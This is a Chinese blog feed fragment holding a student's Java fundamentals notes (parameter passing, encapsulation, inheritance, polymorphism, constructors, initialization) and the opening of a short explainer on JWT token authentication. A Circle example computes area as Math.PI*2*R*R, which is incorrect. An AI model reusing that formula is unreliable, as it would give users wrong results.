    <content><![CDATA[<h1 id="JAVA基础-2"><a href="#JAVA基础-2" class="headerlink" title="JAVA基础-2"></a>JAVA基础-2</h1><p>不会有人跨年还在学java吧？不会吧？</p>
<p>java好无聊，我爱java，java好无聊，我爱java，java好无聊，我爱java，java好无聊，我爱java，java好无聊，我爱java，java好无聊，我爱java。</p>
<h1 id="命令行参数"><a href="#命令行参数" class="headerlink" title="命令行参数"></a>命令行参数</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.命令行参数：它是指给main方法传递的参数，叫做命令行参数</span><br><span class="line">2.如何给main方法的形参(String[] args)传值</span><br><span class="line">（1）命令行中</span><br><span class="line">java 类名 参数1 参数2 参数3</span><br><span class="line">（2）idea</span><br><span class="line">在run菜单，Edit Configurations</span><br><span class="line">填写mainclass，然后填写program arguments：参数之间使用空格分隔</span><br></pre></td></tr></table></figure>

<h2 id="方法的参数传递机制"><a href="#方法的参数传递机制" class="headerlink" title="方法的参数传递机制"></a>方法的参数传递机制</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">方法的实参负责给形参赋值：</span><br><span class="line">（1）形参是基本数据类型，那么实参给形参的是数据指，而且是书举止的“副本”。</span><br><span class="line">（2）形参是引用数据类型，那实参给形参传递的是地址值，而且是地址值的“副本”。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">方法的参数传递机制：</span><br><span class="line">1.方法的形参是基本数据类型时，形参的值的改变不会影响实参。</span><br><span class="line">2.方法的形参是数据应用类型时，形参地址值的改变不会影响实参，但是形参地址值里面的数据改变会影响实参。比如，修改数组元素的值，或修改对象的属性值。</span><br></pre></td></tr></table></figure>

<p>一个扩展小栗子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">new</span> test().change(i);<span class="comment">//这是一个匿名对象，目的就是为了执行一次change方法。而方法影响的是基本数据类型，所以基本数据类型值不会变，他们都不是一个内存地址。</span></span><br><span class="line"></span><br><span class="line">        i = i++;<span class="comment">//先取i的值，放到操作数栈中。i自增为1。把操作数栈中的0赋值给i。所以最后结果还是0</span></span><br><span class="line">        System.out.println(<span class="string">&quot;i=&quot;</span>+i);<span class="comment">//输出0</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">change</span><span class="params">(<span class="keyword">int</span> i )</span></span>&#123;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="方法的重载（Overload）"><a href="#方法的重载（Overload）" class="headerlink" title="方法的重载（Overload）"></a>方法的重载（Overload）</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.方法的重载，当一个类中出现了方法名相同，新参列表不同的两个或多个方法，称为方法的重载。</span><br><span class="line">例如：</span><br><span class="line">定义方法求两个整数的最大值。</span><br><span class="line">定义方法求三个整数的最大值。</span><br></pre></td></tr></table></figure>

<h2 id="方法的递归调用"><a href="#方法的递归调用" class="headerlink" title="方法的递归调用"></a>方法的递归调用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当方法自己调用自己就是递归。</span><br></pre></td></tr></table></figure>

<p>必须有出口，不能无限递归，否则会出现把栈内存耗尽。</p>
<p>额感觉没什么写的，和py差不多，可以参考以前的文章。</p>
<h1 id="对象数组"><a href="#对象数组" class="headerlink" title="对象数组"></a>对象数组</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">之前的数组，都是存储的int类的，基本数据类型的数组。</span><br><span class="line">而这对象数组，元素是引用数据类型。</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//演示：存储五个圆对象存储到数组当中</span></span><br><span class="line"><span class="comment">//首先创建一个圆对象，代码如下</span></span><br><span class="line"><span class="keyword">package</span> lianxi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Circle</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> R;<span class="comment">//半径</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">jisuanS</span><span class="params">(<span class="keyword">double</span> R)</span></span>&#123;</span><br><span class="line">        <span class="keyword">double</span> S = Math.PI*<span class="number">2</span>*R*R;</span><br><span class="line">        <span class="keyword">return</span> S;</span><br><span class="line">    &#125;<span class="comment">//计算面积</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">jisuanL</span><span class="params">(<span class="keyword">double</span> R)</span></span>&#123;</span><br><span class="line">        <span class="keyword">double</span> L = Math.PI*<span class="number">2</span>*R;</span><br><span class="line">        <span class="keyword">return</span> L;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">info</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;半径:&quot;</span>+R+<span class="string">&quot;;面积：&quot;</span>+jisuanS(R)+<span class="string">&quot;;周长：&quot;</span>+jisuanL(R));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//接下来需要创建五个圆的对象，来存到数组当中去。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> lianxi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">diaoyong</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//先声明和创建数组，长度为5</span></span><br><span class="line">        <span class="comment">//元素的类型:Circle</span></span><br><span class="line">        <span class="comment">//以为数组的声明和动态初始化的公式</span></span><br><span class="line">        <span class="comment">//元素的数据类型[] 数组名 = new 元素的数据类型[长度]</span></span><br><span class="line">        Circle[] arr = <span class="keyword">new</span> Circle[<span class="number">5</span>];</span><br><span class="line">        <span class="comment">//元素类型是Cilrcle，那么必须赋值为Circle的对象</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i&lt; arr.length;i++)&#123;</span><br><span class="line">            arr[i] = <span class="keyword">new</span> Circle();</span><br><span class="line">            arr[i].R = Math.random()*<span class="number">9</span>+<span class="number">1</span>;<span class="comment">//[1,10)</span></span><br><span class="line">            System.out.println(arr[i].info());<span class="comment">//调用类中的方法</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="面向对象-中级"><a href="#面向对象-中级" class="headerlink" title="面向对象-中级"></a>面向对象-中级</h1><h2 id="面向对象的基本特征：封装性"><a href="#面向对象的基本特征：封装性" class="headerlink" title="面向对象的基本特征：封装性"></a>面向对象的基本特征：封装性</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">面向想对象这个编程思想，有三个基本特征：</span><br><span class="line">1.封装</span><br><span class="line">2.继承</span><br><span class="line">3.多态</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">什么封装性？</span><br><span class="line">1.隐私-&gt;安全，当某个类的代码，内部某些成员不希望外部知晓，或者是随意的更改，那么就可以进行适当的封装。</span><br><span class="line">2.外部使用更方便</span><br><span class="line">	生活中，洗衣机，只会留出几个简单的按钮和进水口出水口，放衣服的地方。隐藏了内部复杂的结构。</span><br><span class="line">	代码中同样如此，String类，它内部的结构和实现是很复杂的，但是我们就算不是特别清楚每一个内部实现。也不影响我们简单的使用。</span><br><span class="line"></span><br><span class="line">把代码（成员等）控制在它的合理的可见性范围内，就是一个封装。</span><br><span class="line"></span><br><span class="line">如何实现封装？</span><br><span class="line">必须依赖于权限修饰符，或者又称为访问控制修饰。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">权限修饰符有哪些？</span><br><span class="line">public\protected\private\和什么都没有写</span><br></pre></td></tr></table></figure>

<p>可见性范围分为四种情况：</p>
<p><img src="/2022/12/31/JAVA%E5%9F%BA%E7%A1%80-2/image-20221220172200991.png" alt="image-20221220172200991"></p>
<h2 id="属性私有化和get、set方法"><a href="#属性私有化和get、set方法" class="headerlink" title="属性私有化和get、set方法"></a>属性私有化和get、set方法</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">成员变量选择哪种权限修饰符？</span><br><span class="line">实际应用当中，习惯上，先声明为private，称为属性私有化</span><br><span class="line">但是如果确实这个成员变量需要扩大它的可见性范围，那么可以把private修改为其他合适的修饰符。</span><br><span class="line">例如：扩大到本包，那么就是缺省</span><br><span class="line">例如：扩大到其他包的子类中，那就是protected</span><br><span class="line">例如：扩大到任意位置，那么就是public</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">因为属性就是代表对象的数据，对象的数据是非常重要的。不应该完全暴露，至少要可控。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如何使用私有化的属性</span><br><span class="line">如果这个属性确实要被外部使用，需要停工get或set方法。</span><br><span class="line">get方法：供调用者获取属性值的方法</span><br><span class="line">set方法：供调用者修改属性值的方法</span><br><span class="line"></span><br><span class="line">get/set方法要注意的地方：</span><br><span class="line">1.如果方法中有局部变量（通常是形参）与对象的实例变量“重名”，那么需要在实例变量前面加上&quot;this.&quot;</span><br><span class="line">2.get/set的方法名不能随便写，通常都是get+属性名，并且属性名首字母大写。</span><br><span class="line">3.如果属性（实例变量）是boolean类型，那么它对应的get方法换成is。符合英语用词的习惯。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">下面给两个栗子(*^▽^*)//java还是好无聊啊，但是还是坚持一下捏</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//pri类</span></span><br><span class="line"><span class="keyword">package</span> lianxi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">pri</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name = <span class="string">&quot;leo&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//调用pri类</span></span><br><span class="line"><span class="comment">//接下来需要创建五个圆的对象，来存到数组当中去。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> lianxi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">diaoyong</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        pri test = <span class="keyword">new</span> pri();</span><br><span class="line">        System.out.println(test.getName());</span><br><span class="line">        test.setName(<span class="string">&quot;wanheiqiyihu&quot;</span>);</span><br><span class="line">        System.out.println(test.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*输出结果</span></span><br><span class="line"><span class="comment">leo</span></span><br><span class="line"><span class="comment">wanheiqiyihu</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h1 id="IDEA自定义代码模板"><a href="#IDEA自定义代码模板" class="headerlink" title="IDEA自定义代码模板"></a>IDEA自定义代码模板</h1><p><img src="/2022/12/31/JAVA%E5%9F%BA%E7%A1%80-2/image-20221221161107768.png" alt="image-20221221161107768"></p>
<p>在这个功能点，就可以自定义一系列的代码模板。</p>
<h1 id="面向对象的基本特征：继承"><a href="#面向对象的基本特征：继承" class="headerlink" title="面向对象的基本特征：继承"></a>面向对象的基本特征：继承</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.什么是继承？</span><br><span class="line">重复使用已有的类的代码（代码的复用）</span><br><span class="line">扩展已有类的代码</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如何继承</span><br><span class="line">关键字:extends</span><br><span class="line">语法格式</span><br><span class="line">【修饰符】 class 子类名 extends 父类名&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">子类：SubClass,又称派生类</span><br><span class="line">父类：SuperClass,又称基类，超类</span><br></pre></td></tr></table></figure>

<p>事物范围来说，子类小于父类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">继承的特点：</span><br><span class="line">1.子类会继承父类所有的实例变量和实例方法。</span><br><span class="line">A:虽然子类继承了父类所有的实例变量和实例方法，但是因为权限原因，某些成员在子类中不能直接使用。</span><br><span class="line">例如private修饰的成员，在子类中是不能直接使用的。</span><br><span class="line">权限修饰符缺省的成员，在跨包的子类中是不能直接使用的，本包子类可以。</span><br><span class="line">B:这里说的继承所有，是说，子类代表的这个事物，它具备父类中所描述的所有特征。</span><br><span class="line">C:既然是子类继承了所有的实例变量，那么在子类对象创建时，那么需要在子类对象的堆空间中开辟对应的内存来存它的值。</span><br><span class="line">D:所谓的继承，不是说，父类的代码在子类中完全重复一遍，而是在使用子类时，除了可以使用自己本类声明的成员，还可以去父类中寻找可以使用的成员。</span><br><span class="line"></span><br><span class="line">2.java只支持单继承，不支持多继承</span><br><span class="line">一个子类只能有一个“直接”父类。</span><br><span class="line">3.java支持多层继承</span><br><span class="line">也就是可以有爷爷等。</span><br></pre></td></tr></table></figure>

<h2 id="查看继承关系快捷键"><a href="#查看继承关系快捷键" class="headerlink" title="查看继承关系快捷键"></a>查看继承关系快捷键</h2><p>例如：选择A类名，按Ctrl + H就会显示A类的继承树。</p>
<p><img src="/2022/12/31/JAVA%E5%9F%BA%E7%A1%80-2/image-20211230090701383.png" alt="image-20211230090701383">：A类的父类和子类</p>
<p><img src="/2022/12/31/JAVA%E5%9F%BA%E7%A1%80-2/image-20211230090719430.png" alt="image-20211230090719430">：A类的父类</p>
<p><img src="/2022/12/31/JAVA%E5%9F%BA%E7%A1%80-2/image-20211230090732532.png" alt="image-20211230090732532">：A类的所有子类</p>
<p>例如：在类继承目录树中选中某个类，比如C类，按Ctrl+ Alt+U就会用图形化方式显示C类的继承祖宗</p>
<p><img src="/2022/12/31/JAVA%E5%9F%BA%E7%A1%80-2/image-20211229180113255.png" alt="image-20211229180113255"></p>
<h1 id="面向对象基本特征：多态"><a href="#面向对象基本特征：多态" class="headerlink" title="面向对象基本特征：多态"></a>面向对象基本特征：多态</h1><p>有的时候，我们在设计一个数组、或一个成员、或一个方法的形参、返回值类型时，无法确定它的具体的类型，只能确定他是某个系列的类型。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">什么是多态？</span><br><span class="line">父类类型 变量 = 子类的对象；</span><br><span class="line">下面有个栗子来弄一些</span><br></pre></td></tr></table></figure>

<p><img src="/2022/12/31/JAVA%E5%9F%BA%E7%A1%80-2/image-20221225121933795.png" alt="image-20221225121933795"></p>
<p>多态的现象：子类重写了父类的方法，通过父类的变量调用重写的方法时，执行的是子类重写后的方法。</p>
<p>编译时类型和运行时类型不一样，编译时时父类的类型，子类时是子类的类型，所以它会执行子类重写的代码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">多态引用的好处与弊端</span><br><span class="line">弊端：编译时，只能调用父类声明的方法，不能调用子类扩展的方法。</span><br><span class="line">好处：运行时，看子类，如果子类重写了方法，一定是执行子类重写的方法体；变量引用的子类对象不同，执行的方法就不同，实现动态绑定。代码编写更灵活，功能更强大，可维护性和扩展性更好了。</span><br></pre></td></tr></table></figure>

<p>所以，一般用多态的时候，需要子类重写方法才可以用，父类记得声明。</p>
<h2 id="向上转型与向下转型"><a href="#向上转型与向下转型" class="headerlink" title="向上转型与向下转型"></a>向上转型与向下转型</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Person p1 = <span class="keyword">new</span> Man();</span><br><span class="line">p1.eat();</span><br><span class="line">p1.walk();</span><br><span class="line"></span><br><span class="line"><span class="comment">//p1.smoke();编译时看父类Person，Person类中没有这个方法，编译不通过。</span></span><br><span class="line">Man m = (Man) p1;<span class="comment">//强制类型转换</span></span><br><span class="line">m.smoke();</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">向上转型：</span><br><span class="line">person p1 = new Man();</span><br><span class="line">	自动类型转换。</span><br><span class="line">	当把子类对象赋值给父类的变量时，在编译时会自动提升为父类的类型。</span><br><span class="line">向下转型：</span><br><span class="line">Person p1 = new ChineseMan();</span><br><span class="line">Man m = (Man)p1;</span><br><span class="line">	如果需要调用子类扩展的方法时，必须向下转型，通过强制类型转换完成。这样才能通过编译。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">向上转型：只要满足，对象是这个变量的子类类型就可以。</span><br><span class="line">向下转型：必须满足，对象的运行时类型&lt;=()中向下转的类型。</span><br></pre></td></tr></table></figure>

<p>但是值得注意的是，成员变量并没有多态，比如说father里面有个a变量，son里面有个a变量，son中的a不会覆盖father中的a。而是son中有2个a变量，但是调用的时候，如果直接调用a，那么就是调用的son中的变量。如果想要调用father中的a，需要像下面这样调用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Son s = <span class="keyword">new</span> Son();</span><br><span class="line">sout(((Father)s).a);<span class="comment">//把s向上转型为Father类型，让编译器从Father中取a。</span></span><br></pre></td></tr></table></figure>

<h2 id="虚方法"><a href="#虚方法" class="headerlink" title="虚方法"></a>虚方法</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">什么是虚方法？</span><br><span class="line">凡是可以被子类重写的方法都叫做虚方法。</span><br><span class="line">不能重写的方法有：private等（后面还会学习static等</span><br></pre></td></tr></table></figure>

<h2 id="多态现象发生的前提"><a href="#多态现象发生的前提" class="headerlink" title="多态现象发生的前提"></a>多态现象发生的前提</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.继承</span><br><span class="line">2.有多态引用</span><br><span class="line">父类类型 变量 = 子类的对象;</span><br><span class="line">变形：</span><br><span class="line">	父类的类型[] 数组名 = new 父类的类型[长度]；</span><br><span class="line">	数组名[下标] = 子类的对象;</span><br><span class="line">	</span><br><span class="line">形参的类型是父类的类型，实参是子类的对象。</span><br><span class="line"></span><br><span class="line">方法的返回值类型是父类的类型，返回到实际结果是子类的对象。</span><br><span class="line"></span><br><span class="line">某个成员变量声明的是父类类型，实际接收到是子类对象。</span><br><span class="line">3.有虚方法</span><br></pre></td></tr></table></figure>

<h1 id="构造器"><a href="#构造器" class="headerlink" title="构造器"></a>构造器</h1><p>类的第三个成员：构造器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">什么是构造器？</span><br><span class="line">【修饰符】 class 类名&#123;</span><br><span class="line">	【修饰符】 类名()&#123;//构造器</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	【修饰符】 类名(形参列表)&#123;//构造器</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">构造器的作用是什么？</span><br><span class="line">1.new对象，即new关键字后面出现的一定是构造器，也只能是构造器。</span><br><span class="line">2.在new对象的同时，给对象的“实例变量”初始化，即赋值。（初始化的时候就不用使用set方法了，但是在后续修改的时候还是需要使用set方法的）</span><br><span class="line"></span><br><span class="line">注意：</span><br><span class="line">1.构造器长得像方法，所以又称为构造方法</span><br><span class="line">2.和方法不同的地方</span><br><span class="line">A:构造器的名称不能随意乱写，只能也一定要和类名一致（大小写也要一样）</span><br><span class="line">B:构造器没有返回值类型</span><br><span class="line">C:构造器的修饰符只能是权限修饰符，可以有四中情况，private、缺省、protected、public</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">构造器的特点:</span><br><span class="line">1.如果一个类没有手动编写任意构造器，那么编译器会将自动添加一个默认的无参构造。而且此时构造器的权限修饰符默认和class类前面的权限修饰符一致。</span><br><span class="line">2.如果你手动编写了任意一种构造器，那么编译器就不会在自动添加一个默认的无参构造。</span><br><span class="line">3.所以如果某个类中编写了构造器，那么在其他类中调用这个类的时候，就不能使用new后面的无参构造了，只能使用编写的构造器进行new。</span><br><span class="line">4.构造器可以重载（可以手动添加无参构造器）</span><br></pre></td></tr></table></figure>

<h2 id="初级栗子"><a href="#初级栗子" class="headerlink" title="初级栗子"></a>初级栗子</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> lianxi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name)</span></span>&#123;<span class="comment">//有参构造器</span></span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> lianxi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Student s1 = <span class="keyword">new</span> Student(<span class="string">&quot;dhk&quot;</span>);</span><br><span class="line">        System.out.println(s1.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面就是定义了Student类中的一个有参构造器，然后在主类中进行调用。</p>
<h2 id="一些小知识"><a href="#一些小知识" class="headerlink" title="一些小知识"></a>一些小知识</h2><h3 id="本类构造器相互调用"><a href="#本类构造器相互调用" class="headerlink" title="本类构造器相互调用"></a>本类构造器相互调用</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">this():调用本类的无参构造</span><br><span class="line">this(实参列表):调用本类的有参构造</span><br><span class="line">this()和this(实参列表)只能出现在构造器首行</span><br><span class="line">不能出现递归调用</span><br></pre></td></tr></table></figure>

<h3 id="构造器在继承时的要求"><a href="#构造器在继承时的要求" class="headerlink" title="构造器在继承时的要求"></a>构造器在继承时的要求</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">问题：</span><br><span class="line">1.父类的构造器会不会继承到子类中？</span><br><span class="line">不会，不管是无参构造器还是有参构造器，都不会继承到子类中去。</span><br><span class="line">2.父类的构造器和子类有没有关系？</span><br><span class="line">A:子类在继承父类时，默认会在子类的构造器首行，加一句代码super();</span><br><span class="line">表示调用父类的无参构造。</span><br><span class="line"></span><br><span class="line">B:那么如果父类没有无参构造，子类构造器中没有做特别处理的话，编译是要报错的。</span><br><span class="line"></span><br><span class="line">C:那么如果父类没有无参构造，子类构造器中首行一定要明确调用父类的哪个有参构造。通过super(实参列表)的方式确定。</span><br><span class="line"></span><br><span class="line">D:如果父类既有无参构造又有有参构造，那么没写super(实参列表)的，就表示调用父类的无参构造。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">为什么子类的构造器一定要调用父类的构造器呢？</span><br><span class="line">因为子类会继承父类所有的成员变量，那么在new子类对象时，必须为这些继承成员变量“初始化”，而为这些成员变量初始化，最合适的就是通过父类的构造器。</span><br></pre></td></tr></table></figure>

<h1 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h1><p>类的第四个成员（结构）—代码块</p>
<h2 id="非静态代码块"><a href="#非静态代码块" class="headerlink" title="非静态代码块"></a>非静态代码块</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.作用：是用来给“实例变量”初始化的</span><br><span class="line">2.意义:把多个构造器中的代码抽取出来，写到代码中，减少代码的冗杂。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小扩展：</span><br><span class="line">在System类中有一个方法可以获取当前系统时间</span><br><span class="line">long System.currentTimeMillis()//距离1970年1月1号0点0分0秒0毫秒的实践差值（时间戳）</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如何使用？</span><br><span class="line">用大括号阔起来，就是一个代码块。new对象的时候就会自动执行这个代码块。每new一个对象执行一次。与构造器相比，是代码块部分先执行。值得注意的是，代码块的位置与执行顺序没有关联。</span><br></pre></td></tr></table></figure>

<h1 id="实例初始化的过程"><a href="#实例初始化的过程" class="headerlink" title="实例初始化的过程"></a>实例初始化的过程</h1><p>此部分作为了解</p>
<p>实例：对象</p>
<p>实例初始化：对象初始化，就是给对象的“实例变量”初始化。</p>
<p>实例变量：他就是成员变量，准确的说，他是指非静态的成员变量，又经常成为属性。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">但是很多文章和教科书都会把属性和实例变量做区分，区分为有get/set方法的实例变量叫属性。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">什么时候进行实例初始化呢？</span><br><span class="line">一定实在new对象的时候</span><br><span class="line"></span><br><span class="line">那些代码是和实例初始化有关的？</span><br><span class="line">1.实例变量声明后面的显示赋值</span><br><span class="line">2.非静态代码块</span><br><span class="line">3.构造器</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">实例初始化的过程</span><br><span class="line">1.实例初始化过程其实是在调用一个&lt;init&gt;的方法</span><br><span class="line">2.&lt;init&gt;方法不是由程序员显式声明的，而是由编译器根据上面三个代码部分（构造器等），按照一定的顺序组装而成的。</span><br><span class="line">3.一个类编写了几个构造器，构造器就会组成几个&lt;init&gt;方法，如果程序员没有手动编写任意构造器，那么编译器会更具自动添加到默认的无参构造自动组装一个无参的&lt;init&gt;方法。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;init&gt;方法如何组装以下三个部分代码：</span><br><span class="line">A:实例变量声明后面的显式赋值</span><br><span class="line">B:非静态代码块</span><br><span class="line">C:构造器</span><br><span class="line"></span><br><span class="line">（1）先把构造器首行的super()或super(实参列表)提前出来，放到&lt;init&gt;方法的首行</span><br><span class="line">（2）按照程序员编写的A和B的自然顺序，一次组装她两。</span><br><span class="line">（3）把构造器的代码组装在（2）的下面。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">总结</span><br><span class="line">1.new调用构造器，本质上是执行它对应的&lt;init&gt;方法</span><br><span class="line">2.每一个构造器都会有自己对应的&lt;init&gt;方法</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>-java</category>
      </categories>
  </entry>
  <entry>
    <title>JWT技术——基于token的鉴权机制</title>
    <url>/2022/03/04/JWT%E6%8A%80%E6%9C%AF%E2%80%94%E2%80%94%E5%9F%BA%E4%BA%8Etoken%E7%9A%84%E9%89%B4%E6%9D%83%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<p>今天挖洞 问了jwt技术</p>
<h1 id="JWT技术——基于token的鉴权机制"><a href="#JWT技术——基于token的鉴权机制" class="headerlink" title="JWT技术——基于token的鉴权机制"></a>JWT技术——基于token的鉴权机制</h1><h1 id="1-基本流程"><a href="#1-基本流程" class="headerlink" title="1.基本流程"></a>1.基本流程</h1><p>JWT技术（基于token的鉴权机制）</p>
<p>流程上是这样的：</p>
<p>用户使用用户名密码来请求服务器</p>
<p>服务器进行验证用户的信息</p>
<p>服务器通过验证后生成一个token发送给用户</p>
<p>客户端存储token，并在每次请求时附送上这个token值</p>
<p>服务端验证token值，并返回数据</p>
<h1 id="2-与session的区别"><a href="#2-与session的区别" class="headerlink" title="2.与session的区别"></a>2.与session的区别</h1><p> <a href="https://so.csdn.net/so/search?q=JWT&spm=1001.2101.3001.7020">JWT</a>和Session技术的根本区别在于，Session是把访问者信息存储在服务器端的，而JWT是把信息存储在客户端。</p>
<h1 id="3-弊端"><a href="#3-弊端" class="headerlink" title="3.弊端"></a>3.弊端</h1><p> JWT方式，每次请求都要带上token，服务器每次都要解密出token的信息，这会让服务器有一些计算压力。而且，如果客户端的信息比较多，每次HTTP请求携带的数据就比较多。还有一点，JWT在客户端的存储，不能包含敏感信息，否则很容易被泄露，而且不建议在客户端存储会变动的信息，否则可能出现一致性问题。</p>
